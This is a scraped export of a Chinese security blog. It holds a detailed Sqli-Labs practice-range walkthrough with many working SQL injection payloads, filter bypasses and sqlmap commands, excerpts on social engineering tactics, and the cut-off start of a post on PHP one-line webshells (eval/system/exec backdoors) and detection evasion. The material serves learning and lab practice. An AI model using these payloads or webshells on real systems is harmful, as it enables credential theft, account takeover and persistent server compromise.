————-感悟\n只有关掉的计算机才是真正安全的计算机。\nInternet的前身，鸡早期的ARPANet的设计初衷是为了让政府、研究机构和教育机构共享研究信息。设计所追求的目标是信息自由和技术先进性。因此，许多教育机构在建立起早期的计算机系统时，很少或最根本没有考虑安全性。\n","categories":["Tech Blog"]},{"title":"Sqli-Labs 靶场过关记录","url":"/2023/08/10/Tech%20Blog/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3%E8%AE%B0%E5%BD%95/","content":"Sqli-Labs是一个颇为出名的SQL注入靶场，提供了丰富的SQL注入演习靶场我在本地搭建的SQLInjection靶场环境为Apache2.4.39,MySQL8.0.12与PHP5.3.29nts.靶场仓库地址日后有空就Fork靶场仓库，使其适配最新版PHP与MySQL并写入注释解读每一关代码并拓展关卡对应技术知识😇\n\n尽管 sqli-labs 的 index 页面显示它有 75 关，但无论是翻阅靶场文件还是阅读其他通关攻略，都只找得到 65 关，故 65 这个关卡数应该才是正确的 :P\n\nPage-1 Basic InjectionsSQL 注入漏洞的一般利用流程以第一关为例，当我们发现攻击对象存在 SQL 注入漏洞的注入点时，常通过以下流程进行漏洞利用\n假设我们通过联表查询进行数字型 SQL 注入，其中被注入语句为\nSELECT * FROM USERS WHERE ID = &#123;USER_INPUT&#125;\n\n假设 USERS 表有 3 个字段 ，分别为 ID,USERNAME,PASSWORD ， 为达成攻击目的，常使用以下 Payload\n\n测试列数\n\n-1 ORDER BY 1 #-1 ORDER BY 2 #-1 ORDER BY 3 #...-1 ORDER BY N ## 直到列数到不报错为止\n\n或者\n-1 UNION SELECT 1 #-1 UNION SELECT 1,2 #-1 UNION SELECT 1,2,3 ## 这样做的好处是可以确定前端输出的数据位于 SQL 语句的查询的第几位\n\n\n判断出原 SQL 语句查询的列数（根据假定情况为 3 位）后，获取库名，系统版本号\n\n-1 UNION SELECT 1,DATABASE(),VERSION() #\n\n\n获取当前数据库下的所有表\n\n-1 UNION SELECT 1,group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=DATABASE()\n\n\n获取当前指定表的所有字段\n\n-1 UNION SELECT 1,group_concat(column_name),2 FROM information_schema.columns WHERE table_name=&quot;USERS&quot;\n\n\n获取指定表所有字段的值\n\n-1 UNION SELECT 1,group_concat(ID,USERNAME,PASSWORD),2 FROM USERS #\n\n由于 Sqli-labs 靶场只需要绕过简单的 WAF 检测，不涉及其他相较而言更复杂的 Bypass ，故当关卡能够成功进行注入时以上的重复步骤不赘述\n盲注关卡可使用 SQLMAP 进行自动化注入\n第1关根据提示GET传参id&#x3D;1得到回显，传入不同值发现得到回显不同，传入 ?id=1&#39; 判断SQL注入类型，发现是字符型注入，注入 ?id=&#39; ORDER BY 4;--+ 发现总共有3列，注入?id=&#39; union select 1,2,3; --+发现输出时会输出第二第三列，将第二、三列替换为database()，version()得到数据库名为security,数据库版本为8.0.12。由于靶场始终位于同一环境下，不同关卡中得到的信息相同，故以上相同回显以后不再重复记录。注入?id=-1&#39;union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+爆表，共有emails,referers,uagents,users四张表，注入?id=-1%27union%20select%201,group_concat(column_name),2%20from%20information_schema.columns%20where%20table_name=%27users%27--+爆表，得到users表中有USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password六个字段,最后注入?id=-1%27union%20select%201,group_concat(username,id,password),2%20from%20users--+拿到所有用户的用户名与密码\n第2关第二关注入?id=1&#39;得到报错信息，则应该是数字型注入，采用和上一关相同的注入手段即可?id=-1%20union%20select%201,group_concat(username,id,password),2%20from%20users--+\n第3关注入?id=1&#39;得到报错信息，发现后端的SQL语句使用了括号包裹了用户输入，那么在第一关基础上把使用引号闭合改成使用引号和反括号闭合SQL语句即可?id=%27)union%20select%201,group_concat(username,id,password),2%20from%20users--+\n第4关老花样注入?id=1&#39;的时候没有回显，疑惑了一阵，再注入?id=1&quot;发现输入被双引号包裹，故依然在前一关基础上把单引号反括号改成用双引号反括号闭合sql语句即可?id=%22)%20union%20select%201,group_concat(username,id,password),2%20from%20users%20--+\n第5关没有回显，一般要么报错注入要么布尔注入，可以自己写脚本注入或者SQLMap一把梭 :P?id=1&#39; and XXXXsqlmap -u &quot;http://localhost/sqli-labs-master/Less-5?id=1&quot; -D security -T users --columns --batch\n第6关没有回显，也是布尔注入，测试参数时不难发现第六关是第五关的双引号版?id=1&quot; and XXXXsqlmap -u &quot;http://localhost/sqli-labs-master/Less-6?id=1&quot; -D security -T users --columns --batch\n第7关在第5关的基础上更进了一步，把报错信息黑箱了，注入?id=1&#39;时只能知道”You have an error in your SQL syntax”而没有具体的报错，但注入?id=1&quot;时却没报错，说明是单引号闭合了SQL语句，注入?id=1&#39;--+依然报错，说明SQL语句没有完全闭合，尝试添加一个括号，仍然报错，有点没有头绪，看了php源代码，发现前端输入被一个单引号和两个括号包裹，因此注入时and前面的部分写成?id=1&#39;))即可?id=1)) and XXXXsqlmap -u &quot;http://localhost/sqli-labs-master/Less-7?id=1&quot; -D security -T users --columns --batch&#96;&#96;\n第8关和第5关一样，只是没有了第5关的报错信息?id=1&#39; and XXXXsqlmap -u &quot;http://localhost/sqli-labs-master/Less-8?id=1&quot; -D security -T users --columns --batch\n第9关无论参数怎么填页面都没有变化，应该是时间盲注，建议一把梭?id=1&#39; and if(XXX,sleep(5),1)--+sqlmap -u &quot;http://localhost/sqli-labs-master/Less-9?id=1\\&#39;&quot; -D security -T users --columns --batch\n第10关第9关换成双引号即可?id=1&quot; and if(XXX,sleep(5),1)--+sqlmap -u &quot;http://localhost/sqli-labs-master/Less-10?id=1\\&quot;&quot; -D security -T users --columns --batch\n第11关POST方法版的第一关，需要注意的是post方法的data数据不会被URL编码，把–&#x3D;改成–(空格)即可\n第12关双引号加括号版的第11关\n第13关单引号加括号版的第11关\n第14关双引号版的第11关\n第15关没有错误信息的回显的第11关，布尔盲注即可\n第16关没有错误信息的回显的第12关\n第17关开始上强度了，看不明白这页面是干什么的，尝试各种注入点页面都没什么变化。看源代码白盒测试😈php代码的基本功能是获取前端输入的用户名的前十五位，对这十五个字符的特殊字符进行mysql_real_escape_string转义，如果用户名存在则将用户密码更改为前端输入的密码。在判断用户名的流程中,后端语句使用了select语句，翻了翻PHP手册发现mysql_real_escape_string发现可以宽字节注入绕过,但这样注没有回显。继续看代码发现UPDATE的sql语句执行错误时会回显错误信息，判断为报错注入。password字段我们可以注入的语句为:\nextractvalue版本爆版本 1&#39; and extractvalue(1,concat(0x5c,version(),0x5c))#\n爆数据库 1&#39; and extractvalue(1,concat(0x5c,database(),0x5c))#\n爆表名 1&#39; and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c))#\n爆字段名 1&#39; and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x5c))#\n爆字段内容(该格式针对mysql数据库) 1&#39; and extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#39;admin1&#39;) b) ,0x5c))#\n爆字段内容 1&#39; and extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c))#\nupdatexml版本爆版本 1&#39; and updatexml(1,concat(0x5c,version(),0x5c),1)#\n爆数据库 1&#39; and updatexml(1,concat(0x5c,database(),0x5c),1)#\n爆表名 1&#39; and updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1)#\n爆字段名 1&#39; and updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name =&#39;users&#39;),0x5c),1)#\n爆密码该格式针对mysql数据库 1&#39; and updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;admin1&#39;) b),0x5c),1)#\n爆表 1&#39; and updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name =&#39;users&#39;),0x5c),1)#\n第18关进入页面发现会显示你的ip地址，使用Dumb:Dumb成功登录后页面会回显Ip地址和User-Agent。查看源码发现本关会对username和password对进行一次包括mysql_real_escape_string函数在内的输入检测，当用户名和密码都正确时执行一个INSERT语句，将UA和IP插入到数据库中。这样的话这关有三种思路，一是采用宽字节注入等方式绕过输入检测，二是尝试利用INSERT语句写入shell，三是通过修改请求头的UA字段进行报错注入。显然这里更可能是在要求我们使用第三种方法。在进行报错注入时需要注意执行的SQL语句”INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent’, ‘$IP’, $uname)”;在闭合时我们需要闭合单引号和括号，同时被闭合的内容要满足有三个参数，即1&#39;,2,3)#其中2和3的位置可以换成报错注入语句，例如1&#39;,2,extractvalue(1,concat(0x5c,version(),0x5c)))#\n第19关Referer字段版本的第18关\n第20关Cookie字段版本的第18关，将注入语句传入cookie字段的uname参数即可\n第21关抓包发现Cookie的uname参数值经过了base64编码，采用和第20关一样的注入方式即可。本关闭合SQL语句需要用单引号加括号\n第22关用双引号闭合SQL语句版的第21关\nPage-2 Advanced Injection第23关输入单引号报错，但使用–+注释符无法注入，查看源代码发现注释符发现注释符被过滤，则可以利用逻辑运算的短路特性（仔细一想感觉这一特性用不用上不是很重要），使用or 1 = &#39;1闭合注入点之后的语句。以及因此不能使用order by语句判断表的列数。除此以外和第1关一样。?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1\n?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; ),3 or &#39;1&#39;=&#39;1\n?id=-1&#39; union select 1,(select group_concat(password,username) from users),3 or &#39;1&#39;=&#39;1\n第24关这次的页面有了比较大的变化。有一个登陆页面，注册页面和密码修改页面，看了看网站目录更是有八个PHP脚本。狠狠阅读PHP代码，发现网站结构还是比较简单的。核心逻辑位于login.php和login_create.php两个文件中，login.php会根据POST提交的用户名和密码进行查询,执行的SQL语句为$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;容易想到在第一个注入点注入\\，使得第一个注入点的第二个单引号被转义与第二个注入点的第一个单引号闭合，然后我们在第二个注入点进行注入即可。草失败了，再仔细看了看源代码发现login.php使用了mysql_real_escape_string函数而login_create.php使用了mysql_escape_string函数对输入的特殊字符进行转义。首先想到login.php在以上注入的基础上使用宽字节注入有概率能够成功。继续阅读login_create.php的源代码，这个页面在对输入的用户名和密码进行mysql_escape_string过滤后会先判断用户名是否存在，如果是新用户名且初次输入和再次输入的密码相同则将用户名与密码的字段值插入到用户数据库的表中。同时另外一个pass_change.php页面可以在用户名已存在的情况下让我们更改密码。因为转义只发生在php从超全局变量中取值，而不会对SQL数据库中的值转义，因此我们可以把payload当作用户名与密码存入表中，当php程序从表中取出payload执行时实现SQL注入攻击。我们可以通过二次注入实现上面的SQL注入攻击。不过实际注入的时候发现回显只有用户名，那我们就只能干脆把username注入点之后的所有部分都注释掉来查看效果，但发现这样做仍然有问题，问题在于login_create.php在判断用户名是否存在时也会根据username进行一次查询$sql = &quot;select count(*) from users where username=&#39;$username&#39;&quot;;。而存储用户数据的表对username字段限制了长度，按照我的测试用户名最长为20个字符，而经过mysql_escape_string转移后的SQL注入语句很容易就会超过这个限制。我们能够执行的SQL注入语句有很大的限制：(。无奈，我一怒之下查了查sqli-labs的攻略，发现这一关并不像前面的关卡一样需要爆库，而是要求我们利用业务逻辑漏洞进行提权。网站的管理员用户名是admin,那我们就注册名为admin’#的用户，这样当后端从数据库中取出admin’#的被污染的账户数据时sql语句就会变为$sql = &quot;select count(*) from users where username=&#39;admin&#39;#&#39;&quot;;，利用这一漏洞，我们先以admin’#的身份登录，再修改密码，将admin’#的密码修改为任意密码，而后端实际上会将admin账户的密码修改为我们设置的密码，从而实现提权。同样admin可以是我们已知用户名的任何一个人，从而通过二次注入对站点进行攻击。\n第25关一访问页面就能看到提示”All your ‘OR’ and ‘AND’ belong to us”，一试发现果然or和and被过滤掉了，不过比较难绷的是这关没有过滤注释符，那可以按照第1关的方式过关。查看源代码看看有没有什么坑，\n$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive)$id= preg_replace(&#x27;/AND/i&#x27;,&quot;&quot;, $id);\n\n发现对or和and的过滤是将他们替换为空，但是只会替换一次，那也可以使用双写绕过oorr然后按照23关的方式过关。\n第25a关过滤掉and和or版的第一关。\n第26关这一关在上一关的基础上对特殊符号进行了更彻底的过滤，空格，注释符也被过滤掉了。bing了一下尝试了是同制表符换行符换页符代替空格的进行绕过的操作，但是哪怕php脚本里并没有对这些符号进行过滤但还是失败了\n$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive)$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);    //Strip out AND (non case sensitive)$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id);  //strip out /*$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);    //Strip out --$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #$id= preg_replace(&#x27;/[\\s]/&#x27;,&quot;&quot;, $id);    //Strip out spaces$id= preg_replace(&#x27;/[\\/\\\\\\\\]/&#x27;,&quot;&quot;, $id);\n\n不知道是为什么。令人费解，日后再查，mark一下按道理这关可以采用的编码绕过方式有\n\n%09 TAB键（空格）\n%0A 新建一行（空格）\n%0C 新的一页\n%0D return即回车功能 （php-5.2.17,5.3.29成功）\n%0B TAB键（垂直）\n%A0 空格 （php-5.2.17成功）但是失败了，再查资料发现可以采用括号绕过,比如\n\n?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),1))||&#x27;0   爆表?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;aandnd(table_name=&#x27;users&#x27;)))),1))||&#x27;0     爆字段?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#x27;0   爆字段值\n\n因为union select之间的空格想不到怎么用()绕过就干脆使用报错注入了。\n第26a关这一关一是把print(mysql_error())注释掉了，二是使用了单引号和括号包裹参数。按道理和上一关一样应该使用其他字符代替空格进行绕过的，然是也和上一关一样无法绕过那联表查询难以使用。MysqlError回显也没有报错注入也失效了🤔。所幸的是我们能够得知语句执行的正确与否，也就是说这一关应该采用bool注入的方式判断注入结果，但是怎么绕过blacklist呢🤔😫😵🔫\n第27关在26关的基础上过滤了union和select关键字，但没过滤and和or关键字，进一步查看源代码发现\n$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id);//strip out /*$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);//Strip out union$id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);//Strip out select$id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);//Strip out UNION$id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);//Strip out SELECT$id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);//Strip out Union$id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);//Strip out select\n\n过滤了空格，和区分了大小写的select和union关键字，且select过滤了两次，那我们可以采用union双写，select三写或者union与select混合大小写的方式绕过针对union和select关键字的过滤，然后和第26关使用一样的方式进行注入即可\n?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;security&#x27;))),1))or&#x27;0  爆表?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;security&#x27;and(table_name=&#x27;users&#x27;)))),1))or&#x27;0  爆字段?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or&#x27;0  爆字段值\n\n第27a关使用了双引号且关掉了回显的第27关，和26a关类似😈\n第28关byd突然可以使用%0A代替空格了这是为什么呢🤔不断fuzz发现本关过滤了”union select”这样一个关键字组合，双写这个关键字组合便可绕过，阅读源代码发现输入被单引号和括号包裹，按照第26关的注入方式注入即可。本关POC如下\n?id=&#39;)%0Aunionunion%0Aselect%0Aselect%0A1,2,3%0Aor%0A(&#39;\n第28a关青春版第28关，blacklist变为只过滤”union select”关键字组合，直接套用第28关payload即可\n第29关注入?id&#x3D;1’得到回显发现是字符型注入点，注入?id&#x3D;’ union select 1,2,3 and 1&#x3D;’1成功，进一步注入&#39; union select 1,group_concat(password,&#39;%20 &#39;,username),3 from users --+直接秒了🤔。翻了翻根目录打算看源代码的时候发现原来还有两个页面，一个login.php,一个hacked.php,返回页面接着注😈输入?id&#x3D;1成功访问，id&#x3D;1’时页面跳转到了hacked.php,被WAF抓到了😈果断查看源代码研究WAF是如何运作的。在login.php中，发现后端会对输入的参数值进行正则匹配，正则表达式为^\\d+$,即只能输入数字。但是有一个奇怪的语句whitelist($id1);这似乎是在暗示我们参数不止一个，否则没有必要标出1这个值。经过一些搜索和php程序编写的验证，发现对于$id=$_GET[&#39;id],如果我们在传参的时候采用了?id=value1&amp;id=value2....，即对同一参数重复传参，id变量获取到的是最后一个value值。而用于whitelist函数检验的id1变量只会是第一个参数值。因此本关的绕过思路应该是第一个id参数传正常数字，然后在第二个id参数中写入sql语句?id=1&amp;id=-1 union select 1,group_concat(password,&#39;%20&#39;,username),3 from users --+\n第30关双引号版的第29关\n第31关双引号加括号版的第29关\n第32关看了看关卡名和页面给出了输入的参数值的十六进制回显一眼就能看出这是宽字节注入，在引号前加个%df速通\n?id=-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users--+\n第33关怪了，和32关一样，作者手抖了？\n第34关很奇怪，看起来感觉就是post型的sql注入，但是回显显示%df字符没有被url解码而是直接传进了SQL语句，导致宽字节注入没有成功，太抽象了。而33，32关GET方法传入的%df就被正确的urldecode了。然后在我自己写的post回显验证程序中对post参数值的urldecode又是正常的🤔。这样的话尝试使用%df代表的明文字符或者使用它的其他编码应该能行。绷不住了。二刷做Page4时再尝试解决此问题。如果没出这个问题的话本题在username一栏注入%df&#39; union select 1,group_concat(password,username) from users  #即可\n第35关对id参数值进行addslash处理的第一关。由于是数值型注入，addslash对我们造成的阻碍主要体现在爆表的时候where table_name&#x3D;’tablename’上，不过此处的tablename可以使用不需要使用引号的十六进制编码表示，然后按照第一关步骤来即可\n第36关使用mysql_real_escape_string函数代替addslash函数版的第32关，由于针对特殊字符的转义操作一样，谷可以直接套用32关的payload\n第37关mysql_real_escape_string函数版本的第34关\nPage-3 Stacked Injections第38关可以直接按照第1关的方式过关。同时由于后端使用了支持执行多条sql语句的mysqli_multi_query函数，我们也可以堆叠注入在闭合引号后加上分号，然后进行自己想要做的sql操作，例如修改admin密码或者插入自己的账户等。\n第39关整数注入点版的38关\n第40关单引号加括号进行闭合版的第38关\n第41关关掉了回显的第39关\n第42关本关首页是一个登录页面，点击登录以外的能够交互的ForgotYourPassword和NewUer链接都只会得到包含了YouNeedToHackIn这样一句话的页面。使用在前面的关卡就已经知道了的Dumb:Dumb可以成功登录，登陆后会得到一个密码修改页面，输入原密码和新密码对密码进行修改，以及logout按钮。回到登陆页面，分别对username和passowrd参数进行注入。username字段fuzz无回显，password字段有回显，发现password注入点被双引号包裹。尝试进行报错注入1&quot; and extractvalue(1,concat(0x7e,(select group_concat(password,0x7e,username)from(users)))) #，失败，怒而查看源代码,怎么是单引号包裹的输入🤔,再次注入1&#39; and extractvalue(1,concat(0x7e,(select group_concat(password,0x7e,username)from(users)))) #注入成功。再看源代码，发现漏洞原因是只对账户名进行了转义,而数据库并未采用GBK编码，故无法使用宽字节注入username字段。不过我们可以在密码参数中进行sql注入。而如果要用堆叠注入进行攻击，也是在密码参数处进行堆叠注入即可，比如插入一组账户密码使自己能够登录，不过刚刚试了一下因为后端是只要select语句返回不为空即可登录，那完全可以注入1&#39; or 1=1 #这样类似的万能密码进行登录，堆叠注入又有些多此一举了🤔\n第43关单引号加括号包裹参数版的第42关\n第44关没有回显的第42关\n第45关没有回显的第43关\n第46关按照页面信息对sort参数传入数值，发现给出了users表，分别传入1,2,3发现表中字段的顺序发生了改变。不难猜到传入的sort参数值会作为是ORDER BY语句的参数,因此我们无法使用联表注入,尝试输入错误数值发现有回显，直接报错注入extractvalue(1,concat(0x7e,(select(group_concat(database(),0x7e,user())))))即可\n第47关输入被单引号包裹版的第46关\n第48关没有回显，按照关卡规律猜测是没有回显版的第46关，sqlpmap时间盲注一把梭sqlmap -u &quot;http://localhost/sqli-labs-master/Less-48/?sort=3&quot; -D security -T users -C password,username --dump --batch\n第49关没有回显版的第47关\n第50关mysqli_multi_query函数版的第46关\n第51关mysqli_multi_query函数版的第47关\n第52关mysqli_multi_query函数版的第48关\n第53关mysqli_multi_query函数版的第49关\nPage-4 Challenges第54关与第 1 关一致，唯一的限制注入次数不得超过十次，否则会重置数据库信息\n第55关使用括号闭合的第54关\n第56关使用单引号和括号闭合的第54关\n第57关使用双引号闭合的第54关\n第58关需要在 5 次注入内拿下版本的第 17 关\n\n想 union 注入却死活没注出来，查看源码后发现对应逻辑为\n$sql=&quot;SELECT * FROM security.users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;    echo &#x27;&lt;font color= &quot;#00FFFF&quot;&gt;&#x27;;        $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;&gt;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);    $pass = array_reverse($unames);    echo &#x27;Your Login name : &#x27;. $unames[$row[&#x27;id&#x27;]];    echo &quot;&lt;br&gt;&quot;;    echo &#x27;Your Password : &#x27; .$pass[$row[&#x27;id&#x27;]];    echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;    echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;  &#125;\n\n故只能通过报错注入通过本关\n\n第59关数字型注入点的第 58 关\n第60关双引号加括号闭合注入点的第 58 关\n第61关单引号加双括号闭合注入点的第 58 关\n第62关看到 130 次注入次数上限不难猜到应该是布尔注入。\n使用 payload http://localhost/sqli-labs-master/Less-62/index.php?id=1&#39;)%20and%20sleep(5)%20--+可以判断出注入点使用单引号与括号闭合\nSQLMAP 一把梭就行\n第63关使用单引号闭合的第 62 关\n第64关使用双括号闭合的第 62 关\n第65关使用括号闭合的第 62 关\nReference这些是我在遇到问题和通关后用于对比的其他作者写的通关攻略\n攻略1攻略2\n","categories":["Tech Blog"]},{"title":"《反欺骗的艺术》摘抄其二","url":"/2021/02/02/Tech%20Blog/%E3%80%8A%E5%8F%8D%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF%E3%80%8B%E6%91%98%E6%8A%84%E5%85%B6%E4%BA%8C/","content":"我将其安全性成为“糖果式的安全”，一个又硬又脆的外壳包着一个又软又耐嚼的内核，外边的壳，即防火墙，不能提供充分的保护，因为一旦入侵者绕过或穿透了防火墙，内部计算机系统将极为脆弱。 – —————第六章 “你能帮我吗？”\n地下酒吧式的安全：这种安全依赖于（1）知道所要的信息在何处（2）使用某个词或名字来访问该信息或计算机系统，它实际上意味着某种形式的不加保护。 ————–第六章 “你能帮我吗？”\n给予隐匿度的安全：一种不太有效的计算机安全方法，它依赖于对系统运行的细节情况（协议、算法和内部系统）进行保密，它错误地假设了在可信任的一群人外其他人无法进入系统，给予隐匿度的安全性对于社交工程攻击毫无作用，世界上的每一个计算机系统都至少有一个人会使用它。所以，如果攻击者能巧妙地对付使用者，则系统的隐匿度便变得无关紧要。 ————–第六章 “你能帮我吗？”\n\n\n所有恶意代码中最具破坏力的形式——例如名为求爱信（Love Letter），Cam先生（Sir Cam），库娃（Anna Kournikiva）偶读依赖于社交工程学的欺骗技术，利用邮件附件的形式出现在用户前，声称可以提供某种非常有人的东西，比如机密信息，免费的黄色内容，或者——一种非常聪明的把戏——在邮件中说明所附文件是你订购的一件贵重物品的收据。 ————–第七章 假冒的站点和危险的附件\n面对一个出色的社交工程师，无人能幸免于上当受骗，因为在正常生活中，我们并不总是经过深思熟虑之后再做出决定，即使是非常重要的事情，复杂的情形，时间的缺乏，情绪激动或精神疲劳都很容易是我们分神，所以我们的头脑会走捷径，未对信息做仔细全面的分析就轻易地做出决定，这个心智过程称作“自动反应” – ———第八章 利用同情心，内疚感和胁迫手段\n不必惊讶，人们在选择密码的时候，总是丧失了所有创造力。 —————-第十章 侵入公司领地\n出于某一种古怪的原因，防病毒软件厂商不再市场上发行可检测商业间谍软件的产品。 – ——————–第十二章 针对低级别员工的攻击\n人们为了获取自己想要的东西，或为了摆脱窘境二想出来的种种欺骗手段是多么富于想象力，为保护公共部门和私有领域的信息和计算机系统，你必须使用同样的创造性和想象力。因此，在制定安全政策时，要发挥创造力，思路不能拘于窠臼。 ——————–第十三章 巧妙的骗术\n社交工程师善于利用的，人总是愿意顺从他人的六种心理倾向\n一、权威——提出请求者具有权威或被授权；二、讨人喜欢——提出请求者讨人喜欢或与被害者有相似的兴趣，信念或态度；三、汇报——提出请求者给了或承诺给某类有价值的东西或帮助（人情债）；四、言行一致——人们一旦公开表示过支持或提倡一件事，这会倾向于兑现自己的承诺；五、从众——如果一个人已经与其他人合作过，则未合作的人会倾向于满足其请求；六、供不应求——如果人们认为自己寻求的东西资源紧张切面临竞争，则会倾向于满足请求。\n","categories":["Tech Blog"]},{"title":"一句话木马的实现及免杀","url":"/2023/08/19/Tech%20Blog/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/","content":"简介在渗透测试过程中，攻击者常会上传木马对网站进行进一步地渗透或渗透持久化。这样的木马也被叫做WebShell，在上传这样一个WebShell后，我们可以通过本地地一些WebShell连接工具例如菜刀，蚁剑与冰蝎连接WebShell，进而可以获取信息和控制服务器。而由于例如&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;这样的木马短小精悍隐蔽性强而功能强大，它们也被叫做一句话木马或一句话后门，在入侵过程中有着强大的作用\n考虑到各种一句话木马的原理都相同，我们就只以php为例进行研究。\n\n一句话木马原理剖析以这样一句相当经典的一句话木马为例\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\n\n这首先是一个php语句，因为它被&lt;?php  ?&gt;所包裹。这个php语句的功能是执行eval函数。需要注意的是，eval函数前有一个@符号作为前缀，因此它在执行时不会报错。eval函数的效果是将括号内的字符串当作php代码执行，而将被eval函数当作php代码的字符串是全局变量$_POST[‘cmd’]，这个变量的值为我们通过POST方法传递的cmd参数的参数值也就是说，这个一句话木马的功能是将我们通过POST方法传入的cmd参数值当作php代码在无错误信息回显的情况下执行，简单而强大\nWebShell查杀对于WebShell的查杀思路，大致有以下几种：\n\n分析统计内容（传统）：可以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。\n语义分析（AST）：把代码转换成AST语法树，之后可以对一些函数进行调试追踪，那些混淆或者变形过的webshell基本都能被检测到。但是对于php这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。\n机器学习（AI）：这种方法需要大量的样本数据，通过一些AI自动学习模型，总结归类Webshell的特征库，最终去检测Webshell。\n动态监控（沙箱）：采用RASP方式，一旦检测到有对应脚本运行，就去监控（Hook）里边一些危险函数，一但存在调用过程将会立刻阻止。这种阻止效果是实时的，这种方法应该是效果最好的，但是成本十分高昂。\n\n一句话木马免杀思路与技巧让我们重新看向之前提到的一句话木马\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n攻击者期望最终得到的就是这条代码。一句话木马的免杀主要就是对@eval($_POST[&#39;cmd&#39;])这个部分进行各种各样的混淆。只要能在不触发WAF的情况下能够凑出具有这个一个功能的语句攻击者就能达到目的。\n\ntips:最经典的两个命令执行函数eval和assert两个函数现在被官方视作一个语言构造器而非函数，因此它们不能被可变函数调用，即它们不能通过拼接和混淆执行，只能通过明文写入。因此我们最好考虑一些别的函数\n\n使用其他传参方式&lt;?php @eval($_COOKIE);?&gt;&lt;?php @eval($_GET);?&gt;&lt;?php @eval($_REQUEST);?&gt;&lt;?php @eval($_SESSION);?&gt;\n\n使用其他命令执行函数system()system()可以在系统权限允许的情况下，执行系统命令（Windows系统和Linux系统均可执行）\n&lt;?php @system($_POST[&#x27;cmd&#x27;]);?&gt;\n\nexec()exec() 函数可以执行系统命令，但它不会直接输出结果，而是将执行的结果保存到数组中\n&lt;?phpexec( $_POST[&#x27;cmd&#x27;] , $result );print_r($result); ?&gt;\n\nshell_exec()shell_exec() 可以执行系统命令并返回命令执行结果的字符串\necho shell_exec($_POST[&#x27;cmd&#x27;]); \n\npassthru()passthru() 